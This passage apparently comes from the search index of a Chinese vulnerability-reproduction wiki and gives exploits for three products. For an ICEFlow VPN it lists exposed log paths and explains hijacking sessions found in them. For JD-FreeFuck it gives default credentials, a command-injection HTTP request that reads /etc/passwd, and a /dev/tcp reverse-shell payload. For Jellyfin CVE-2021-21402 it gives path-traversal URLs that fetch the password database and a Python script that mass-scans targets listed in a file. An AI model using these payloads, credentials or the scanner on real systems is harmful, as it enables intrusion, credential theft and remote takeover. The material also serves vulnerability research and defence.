http://url/log/system.log VPN\u65e5\u5fd7 http://url/log/vpn.log \u8bbf\u95ee\u65e5\u5fd7 http://url/log/access.log \u544a\u8b66\u65e5\u5fd7 http://url/log/warn.log \u9519\u8bef\u65e5\u5fd7 http://url/log/error.log \u8c03\u8bd5\u65e5\u5fd7 http://url/log1/debug.log \u79fb\u52a8\u7528\u6237\u65e5\u5fd7 http://url/log/mobile.log \u9632\u706b\u5899\u65e5\u5fd7 http://url/log/firewall.log \u6839\u636e\u65e5\u5fd7\u4fe1\u606f\u83b7\u5f97session\u540e\uff0c\u53ef\u5229\u7528\u5b9e\u65f6\u767b\u5f55\u7cfb\u7edf\u7ba1\u7406\u540e\u53f0\uff1a http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] ICEFlow VPN \u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ICEFlow/ICEFlow%20VPN%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://www.uedbox.com/post/18720/","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"JD-FreeFuck \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 JD-FreeFuck \u5b58\u5728\u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7531\u4e8e\u4f20\u53c2\u6267\u884c\u547d\u4ee4\u65f6\u6ca1\u6709\u5bf9\u5185\u5bb9\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u63a7\u5236\u670d\u52a1\u5668 \u9879\u76ee\u5730\u5740\uff1a https://github.com/meselson/JD-FreeFuck \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] JD-FreeFuck FOFA \u00b6 [!NOTE] title=\"\u4eac\u4e1c\u8585\u7f8a\u6bdb\u63a7\u5236\u9762\u677f\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u540e\u767b\u5f55\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a useradmin/supermanito \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5305\u6267\u884c\u547d\u4ee4 POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 \u5176\u4e2d cmd \u53c2\u6570\u5b58\u5728\u547d\u4ee4\u6ce8\u5165 \u53cd\u5f39shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500 \u53c2\u8003\u6587\u7ae0 \u00b6 @\u6843\u82b1\u5fc3 \u5e08\u5085 https://www.secquan.org/Discuss/1071932#reply3","title":"JD-FreeFuck \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#jd-freefuck-\u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"JD-FreeFuck \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"JD-FreeFuck \u5b58\u5728\u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7531\u4e8e\u4f20\u53c2\u6267\u884c\u547d\u4ee4\u65f6\u6ca1\u6709\u5bf9\u5185\u5bb9\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u63a7\u5236\u670d\u52a1\u5668 \u9879\u76ee\u5730\u5740\uff1a https://github.com/meselson/JD-FreeFuck","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] JD-FreeFuck","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u4eac\u4e1c\u8585\u7f8a\u6bdb\u63a7\u5236\u9762\u677f\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u540e\u767b\u5f55\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a useradmin/supermanito \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5305\u6267\u884c\u547d\u4ee4 POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 \u5176\u4e2d cmd \u53c2\u6570\u5b58\u5728\u547d\u4ee4\u6ce8\u5165 \u53cd\u5f39shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JD-FreeFuck/JD-FreeFuck%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"@\u6843\u82b1\u5fc3 \u5e08\u5085 https://www.secquan.org/Discuss/1071932#reply3","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/","text":"Jellyfin \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2021-21402 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Jellyfin\u662f\u4e00\u4e2a\u514d\u8d39\u8f6f\u4ef6\u5a92\u4f53\u7cfb\u7edf\u3002\u572810.7.1\u7248\u4e4b\u524d\u7684Jellyfin\u4e2d\uff0c\u5e26\u6709\u67d0\u4e9b\u7ec8\u7ed3\u70b9\u7684\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u8bf7\u6c42\u5c06\u5141\u8bb8\u4eceJellyfin\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\u5f53Windows\u7528\u4f5c\u4e3b\u673aOS\u65f6\uff0c\u6b64\u95ee\u9898\u66f4\u4e3a\u666e\u904d\u3002\u66b4\u9732\u4e8e\u516c\u5171Internet\u7684\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u53d7\u5230\u5a01\u80c1\u3002\u5728\u7248\u672c10.7.1\u4e2d\u5df2\u4fee\u590d\u6b64\u95ee\u9898\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5b9e\u65bd\u4e25\u683c\u7684\u5b89\u5168\u6743\u9650\u6765\u9650\u5236\u67d0\u4e9b\u8bbf\u95ee\uff0c\u4f46\u662f\u5efa\u8bae\u5c3d\u5feb\u8fdb\u884c\u66f4\u65b0\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Jellyfin < 10.7.1 FOFA \u00b6 [!NOTE] title='Jellyfin' || body=' http://jellyfin.media ' \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u65e0\u8bba\u662f /Audio/{Id}/hls/{segmentId}/stream.mp3 \u548c /Audio/{Id}/hls/{segmentId}/stream.aac \u8def\u7ebf\u5141\u8bb8\u4efb\u610f\u6587\u4ef6\u5728Windows\u4e0a\u8bfb\u53d6\u3002\u53ef\u4ee5 {segmentId} \u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26 \\ \uff08\u5bf9 %5C URL\u8fdb\u884c\u7f16\u7801\uff09\u5c06\u8def\u7531\u7684\u4e00\u90e8\u5206\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\u3002\u6700\u521d\uff0c\u653b\u51fb\u8005\u4f3c\u4e4e\u53ea\u80fd\u8bfb\u53d6\u4ee5 .mp3 \u548c .aac \u7ed3\u5c3e\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u901a\u8fc7\u5728URL\u8def\u5f84\u4e2d\u4f7f\u7528\u659c\u6760 Path.GetExtension(Request.Path) \u8fd4\u56de\u4e00\u4e2a\u7a7a\u6269\u5c55\u540d\uff0c\u4ece\u800c\u83b7\u5f97\u5bf9\u7ed3\u679c\u6587\u4ef6\u8def\u5f84\u7684\u5b8c\u5168\u63a7\u5236\u3002\u7684 itemId\uff0c\u56e0\u4e3a\u5b83\u6ca1\u6709\u4f7f\u7528\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002\u8be5\u95ee\u9898\u4e0d\u4ec5\u9650\u4e8eJellyfin\u6587\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u4ece\u6587\u4ef6\u7cfb\u7edf\u8bfb\u53d6\u4efb\u4f55\u6587\u4ef6\u3002 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [ HttpGet ( \"Audio/{itemId}/hls/{segmentId}/stream.mp3\" , Name = \"GetHlsAudioSegmentLegacyMp3\" ) ] [ HttpGet ( \"Audio/{itemId}/hls/{segmentId}/stream.aac\" , Name = \"GetHlsAudioSegmentLegacyAac\" ) ] //... public ActionResult GetHlsAudioSegmentLegacy ( [ FromRoute , Required ] string itemId , [ FromRoute , Required ] string segmentId ) { // TODO: Deprecate with new iOS app var file = segmentId + Path . GetExtension ( Request . Path ); //[2] file = Path . Combine ( _serverConfigurationManager . GetTranscodePath (), file ); return FileStreamResponseHelpers . GetStaticFileResult ( file , MimeTypes . GetMimeType ( file ) ! , false , HttpContext ); } \u4f7f\u7528\u5982\u4e0b\u8bf7\u6c42\u5c06\u4f1a\u8bfb\u53d6\u5e26\u6709\u5bc6\u7801\u7684\u6570\u636e\u5e93\u6587\u4ef6 http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ \u53e6\u4e00\u5904\u4ee3\u7801\u5982\u4e0b // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [ HttpGet ( \"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\" ) ] //... public ActionResult GetHlsVideoSegmentLegacy ( [ FromRoute , Required ] string itemId , [ FromRoute , Required ] string playlistId , [ FromRoute , Required ] string segmentId , [ FromRoute , Required ] string segmentContainer ) { var file = segmentId + Path . GetExtension ( Request . Path ); //[2] var transcodeFolderPath = _serverConfigurationManager . GetTranscodePath (); file = Path . Combine ( transcodeFolderPath , file ); //[3] var normalizedPlaylistId = playlistId ; var filePaths = _fileSystem . GetFilePaths ( transcodeFolderPath ); // Add . to start of segment container for future use. segmentContainer = segmentContainer . Insert ( 0 , \".\" ); string ? playlistPath = null ; foreach ( var path in filePaths ) { var pathExtension = Path . GetExtension ( path ); if (( string . Equals ( pathExtension , segmentContainer , StringComparison . OrdinalIgnoreCase ) || string . Equals ( pathExtension , \".m3u8\" , StringComparison . OrdinalIgnoreCase )) //[4] && path . IndexOf ( normalizedPlaylistId , StringComparison . OrdinalIgnoreCase ) != - 1 ) //[5] { playlistPath = path ; break ; } } return playlistPath == null ? NotFound ( \"Hls segment not found.\" ) : GetFileResult ( file , playlistPath ); } \u8be5 /Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer} \u8def\u7531\u5141\u8bb8\u5728Windows\u4e0a\u8bfb\u53d6\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u3002\u53ef\u4ee5 {SegmentId}.{SegmentContainer} \u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26 \\ \uff08\u5bf9 %5C URL\u8fdb\u884c\u7f16\u7801\uff09\u5c06\u8def\u7531\u7684\u4e00\u90e8\u5206\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\u3002\u5728 SegmentId \u4ece\u548c\u6587\u4ef6\u6269\u5c55\u540d Path \u88ab\u7ea7\u8054\u3002\u7ed3\u679c file \u7528\u4f5c Path.Combine [3]\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u4f46\u662f\uff0c\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u5219\u7b2c\u4e00\u4e2a\u53c2\u6570to\u5c06 Path.Combine \u88ab\u5ffd\u7565\uff0c\u800c\u5f97\u5230\u7684\u8def\u5f84\u4ec5\u662f\u7edd\u5bf9\u8def\u5f84 file \u3002 POC\u5982\u4e0b\uff0c\u4e0b\u8f7d\u540c\u6837\u7684\u6587\u4ef6 http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db \u5982\u4e0a\u4e3a\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u548c\u53ef\u5229\u7528\u6027\uff0c\u8be6\u60c5\u94fe\u63a5\u53c2\u8003 https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ \u6f0f\u6d1ePOC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033[0m') print('+ \\033[34mVersion: Jellyfin < 10.7.1 \\033[0m') print('+ \\033[36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e(\u8bfb\u53d6 windows/win.ini), \u94fe\u63a5\u4e3a:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] \u8bf7\u6c42\u62a5\u9519 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402","title":"Jellyfin \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2021-21402"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#jellyfin-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e-cve-2021-21402","text":"","title":"Jellyfin \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e CVE-2021-21402"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Jellyfin\u662f\u4e00\u4e2a\u514d\u8d39\u8f6f\u4ef6\u5a92\u4f53\u7cfb\u7edf\u3002\u572810.7.1\u7248\u4e4b\u524d\u7684Jellyfin\u4e2d\uff0c\u5e26\u6709\u67d0\u4e9b\u7ec8\u7ed3\u70b9\u7684\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u8bf7\u6c42\u5c06\u5141\u8bb8\u4eceJellyfin\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3002\u5f53Windows\u7528\u4f5c\u4e3b\u673aOS\u65f6\uff0c\u6b64\u95ee\u9898\u66f4\u4e3a\u666e\u904d\u3002\u66b4\u9732\u4e8e\u516c\u5171Internet\u7684\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u53d7\u5230\u5a01\u80c1\u3002\u5728\u7248\u672c10.7.1\u4e2d\u5df2\u4fee\u590d\u6b64\u95ee\u9898\u3002\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5b9e\u65bd\u4e25\u683c\u7684\u5b89\u5168\u6743\u9650\u6765\u9650\u5236\u67d0\u4e9b\u8bbf\u95ee\uff0c\u4f46\u662f\u5efa\u8bae\u5c3d\u5feb\u8fdb\u884c\u66f4\u65b0\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Jellyfin < 10.7.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#fofa","text":"[!NOTE] title='Jellyfin' || body=' http://jellyfin.media '","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#\u6f0f\u6d1e\u590d\u73b0","text":"\u65e0\u8bba\u662f /Audio/{Id}/hls/{segmentId}/stream.mp3 \u548c /Audio/{Id}/hls/{segmentId}/stream.aac \u8def\u7ebf\u5141\u8bb8\u4efb\u610f\u6587\u4ef6\u5728Windows\u4e0a\u8bfb\u53d6\u3002\u53ef\u4ee5 {segmentId} \u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26 \\ \uff08\u5bf9 %5C URL\u8fdb\u884c\u7f16\u7801\uff09\u5c06\u8def\u7531\u7684\u4e00\u90e8\u5206\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\u3002\u6700\u521d\uff0c\u653b\u51fb\u8005\u4f3c\u4e4e\u53ea\u80fd\u8bfb\u53d6\u4ee5 .mp3 \u548c .aac \u7ed3\u5c3e\u7684\u6587\u4ef6\u3002\u4f46\u662f\uff0c\u901a\u8fc7\u5728URL\u8def\u5f84\u4e2d\u4f7f\u7528\u659c\u6760 Path.GetExtension(Request.Path) \u8fd4\u56de\u4e00\u4e2a\u7a7a\u6269\u5c55\u540d\uff0c\u4ece\u800c\u83b7\u5f97\u5bf9\u7ed3\u679c\u6587\u4ef6\u8def\u5f84\u7684\u5b8c\u5168\u63a7\u5236\u3002\u7684 itemId\uff0c\u56e0\u4e3a\u5b83\u6ca1\u6709\u4f7f\u7528\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002\u8be5\u95ee\u9898\u4e0d\u4ec5\u9650\u4e8eJellyfin\u6587\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u4ece\u6587\u4ef6\u7cfb\u7edf\u8bfb\u53d6\u4efb\u4f55\u6587\u4ef6\u3002 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [ HttpGet ( \"Audio/{itemId}/hls/{segmentId}/stream.mp3\" , Name = \"GetHlsAudioSegmentLegacyMp3\" ) ] [ HttpGet ( \"Audio/{itemId}/hls/{segmentId}/stream.aac\" , Name = \"GetHlsAudioSegmentLegacyAac\" ) ] //... public ActionResult GetHlsAudioSegmentLegacy ( [ FromRoute , Required ] string itemId , [ FromRoute , Required ] string segmentId ) { // TODO: Deprecate with new iOS app var file = segmentId + Path . GetExtension ( Request . Path ); //[2] file = Path . Combine ( _serverConfigurationManager . GetTranscodePath (), file ); return FileStreamResponseHelpers . GetStaticFileResult ( file , MimeTypes . GetMimeType ( file ) ! , false , HttpContext ); } \u4f7f\u7528\u5982\u4e0b\u8bf7\u6c42\u5c06\u4f1a\u8bfb\u53d6\u5e26\u6709\u5bc6\u7801\u7684\u6570\u636e\u5e93\u6587\u4ef6 http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ \u53e6\u4e00\u5904\u4ee3\u7801\u5982\u4e0b // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [ HttpGet ( \"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\" ) ] //... public ActionResult GetHlsVideoSegmentLegacy ( [ FromRoute , Required ] string itemId , [ FromRoute , Required ] string playlistId , [ FromRoute , Required ] string segmentId , [ FromRoute , Required ] string segmentContainer ) { var file = segmentId + Path . GetExtension ( Request . Path ); //[2] var transcodeFolderPath = _serverConfigurationManager . GetTranscodePath (); file = Path . Combine ( transcodeFolderPath , file ); //[3] var normalizedPlaylistId = playlistId ; var filePaths = _fileSystem . GetFilePaths ( transcodeFolderPath ); // Add . to start of segment container for future use. segmentContainer = segmentContainer . Insert ( 0 , \".\" ); string ? playlistPath = null ; foreach ( var path in filePaths ) { var pathExtension = Path . GetExtension ( path ); if (( string . Equals ( pathExtension , segmentContainer , StringComparison . OrdinalIgnoreCase ) || string . Equals ( pathExtension , \".m3u8\" , StringComparison . OrdinalIgnoreCase )) //[4] && path . IndexOf ( normalizedPlaylistId , StringComparison . OrdinalIgnoreCase ) != - 1 ) //[5] { playlistPath = path ; break ; } } return playlistPath == null ? NotFound ( \"Hls segment not found.\" ) : GetFileResult ( file , playlistPath ); } \u8be5 /Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer} \u8def\u7531\u5141\u8bb8\u5728Windows\u4e0a\u8bfb\u53d6\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u4efb\u610f\u6587\u4ef6\u3002\u53ef\u4ee5 {SegmentId}.{SegmentContainer} \u4f7f\u7528Windows\u8def\u5f84\u5206\u9694\u7b26 \\ \uff08\u5bf9 %5C URL\u8fdb\u884c\u7f16\u7801\uff09\u5c06\u8def\u7531\u7684\u4e00\u90e8\u5206\u8bbe\u7f6e\u4e3a\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84\u3002\u5728 SegmentId \u4ece\u548c\u6587\u4ef6\u6269\u5c55\u540d Path \u88ab\u7ea7\u8054\u3002\u7ed3\u679c file \u7528\u4f5c Path.Combine [3]\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002\u4f46\u662f\uff0c\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7edd\u5bf9\u8def\u5f84\uff0c\u5219\u7b2c\u4e00\u4e2a\u53c2\u6570to\u5c06 Path.Combine \u88ab\u5ffd\u7565\uff0c\u800c\u5f97\u5230\u7684\u8def\u5f84\u4ec5\u662f\u7edd\u5bf9\u8def\u5f84 file \u3002 POC\u5982\u4e0b\uff0c\u4e0b\u8f7d\u540c\u6837\u7684\u6587\u4ef6 http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db \u5982\u4e0a\u4e3a\u8bc1\u660e\u6f0f\u6d1e\u5b58\u5728\u548c\u53ef\u5229\u7528\u6027\uff0c\u8be6\u60c5\u94fe\u63a5\u53c2\u8003 